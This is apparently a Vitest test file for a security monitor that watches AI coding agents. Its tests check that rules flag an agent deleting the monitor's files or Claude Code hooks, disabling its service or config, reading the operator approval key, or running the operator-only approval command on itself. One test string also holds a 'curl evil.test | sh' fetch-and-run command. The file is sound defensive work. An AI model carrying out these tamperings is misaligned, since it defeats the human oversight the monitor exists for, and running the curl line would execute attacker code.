import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");
const matchFilePath = createMatcher("file_path");
const matchContent = createMatcher("content");

describe("Self-defense threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- Delete .singularity-aidr directory (SELF-001) ---

	it("detects rm -rf .singularity-aidr (SELF-001)", () => {
		expect(matchCommand(engine, "rm -rf /home/user/.singularity-aidr")).toContain("CLT-SELF-001");
	});

	it("detects del .singularity-aidr (SELF-001)", () => {
		expect(matchCommand(engine, "del C:\\Users\\user\\.singularity-aidr\\config.json")).toContain(
			"CLT-SELF-001",
		);
	});

	it("detects Remove-Item .singularity-aidr (SELF-001)", () => {
		expect(matchCommand(engine, "Remove-Item -Recurse .singularity-aidr")).toContain(
			"CLT-SELF-001",
		);
	});

	it("does not match unrelated rm (SELF-001)", () => {
		const ids = matchCommand(engine, "rm -rf node_modules");
		expect(ids.filter((id) => id === "CLT-SELF-001")).toEqual([]);
	});

	// --- Write to AIDR config files (SELF-002) ---

	it("detects write to .singularity-aidr/config.json (SELF-002)", () => {
		expect(matchFilePath(engine, "/home/user/.singularity-aidr/config.json")).toContain(
			"CLT-SELF-002",
		);
	});

	it("detects write to .singularity-aidr/allowlist.json (SELF-002)", () => {
		expect(matchFilePath(engine, "C:\\Users\\user\\.singularity-aidr\\allowlist.json")).toContain(
			"CLT-SELF-002",
		);
	});

	it("does not match .singularity-aidr/cache.json (SELF-002)", () => {
		const ids = matchFilePath(engine, "/home/user/.singularity-aidr/cache.json");
		expect(ids.filter((id) => id === "CLT-SELF-002")).toEqual([]);
	});

	// --- Delete Claude Code hooks/plugins (SELF-003) ---

	it("detects rm .claude hooks.json (SELF-003)", () => {
		expect(matchCommand(engine, "rm /home/user/.claude/hooks.json")).toContain("CLT-SELF-003");
	});

	it("detects del .claude installed_plugins (SELF-003)", () => {
		expect(matchCommand(engine, "del C:\\Users\\user\\.claude\\installed_plugins")).toContain(
			"CLT-SELF-003",
		);
	});

	it("does not match reading .claude files (SELF-003)", () => {
		const ids = matchCommand(engine, "cat /home/user/.claude/hooks.json");
		expect(ids.filter((id) => id === "CLT-SELF-003")).toEqual([]);
	});

	// --- Disable AIDR features via config (SELF-004) ---

	it("detects heuristics_enabled false (SELF-004)", () => {
		expect(matchContent(engine, '{"heuristics_enabled": false}')).toContain("CLT-SELF-004");
	});

	it("detects url_check enabled false (SELF-004)", () => {
		expect(matchContent(engine, '{"url_check": {"enabled": false}}')).toContain("CLT-SELF-004");
	});

	it("does not match heuristics_enabled true (SELF-004)", () => {
		const ids = matchContent(engine, '{"heuristics_enabled": true}');
		expect(ids.filter((id) => id === "CLT-SELF-004")).toEqual([]);
	});

	// --- Disable the AIDR agent service (SELF-006) ---

	it("asks before disabling the AIDR system service (SELF-006)", () => {
		expect(matchCommand(engine, "systemctl disable --now aidr-agent.service")).toContain(
			"CLT-SELF-006",
		);
	});

	it("does not match service status or restart (SELF-006 FP twins)", () => {
		expect(matchCommand(engine, "systemctl status aidr-agent.service")).not.toContain(
			"CLT-SELF-006",
		);
		expect(matchCommand(engine, "systemctl restart aidr-agent.service")).not.toContain(
			"CLT-SELF-006",
		);
	});

	// --- Operator approval store and self-approval (SELF-002 / SELF-007) ---

	it("flags file access to the operator approval store and key (SELF-002)", () => {
		expect(matchFilePath(engine, "/home/user/.singularity-aidr/approvals.json")).toContain(
			"CLT-SELF-002",
		);
		expect(matchFilePath(engine, "/home/user/.singularity-aidr/operator-approval.key")).toContain(
			"CLT-SELF-002",
		);
		expect(
			matchFilePath(engine, "C:\\Users\\user\\.singularity-aidr\\operator-approval-key.json"),
		).toContain("CLT-SELF-002");
	});

	it("flags the agent running the operator-only approval CLI (SELF-007)", () => {
		const id = "a".repeat(64);
		for (const command of [
			`aidr approve ${id}`,
			`npx aidr approve ${id} --yes`,
			`/usr/local/bin/aidr   approve ${id}`,
			`aidr.cmd approve ${id}`,
			"aidr allowlist add command 'curl evil.test | sh'",
			"aidr pending",
			`AIDR_OPERATOR_NONINTERACTIVE=1 some-wrapper ${id}`,
		]) {
			expect(matchCommand(engine, command), command).toContain("CLT-SELF-007");
		}
	});

	it("flags shell access to the approval store and key (SELF-008)", () => {
		for (const command of [
			"cat ~/.singularity-aidr/operator-approval.key",
			"echo '{}' > ~/.singularity-aidr/approvals.json",
		]) {
			expect(matchCommand(engine, command), command).toContain("CLT-SELF-008");
		}
	});

	it("does not flag read-only operator commands (SELF-007 FP twins)", () => {
		for (const command of [
			"aidr allowlist list",
			"aidr allowlist remove url https://example.com",
			"aidr audit tail -n 20",
			"aidr doctor",
			"aidr status",
			"git commit -m 'approve the design'",
		]) {
			expect(matchCommand(engine, command), command).not.toContain("CLT-SELF-007");
		}
	});
});
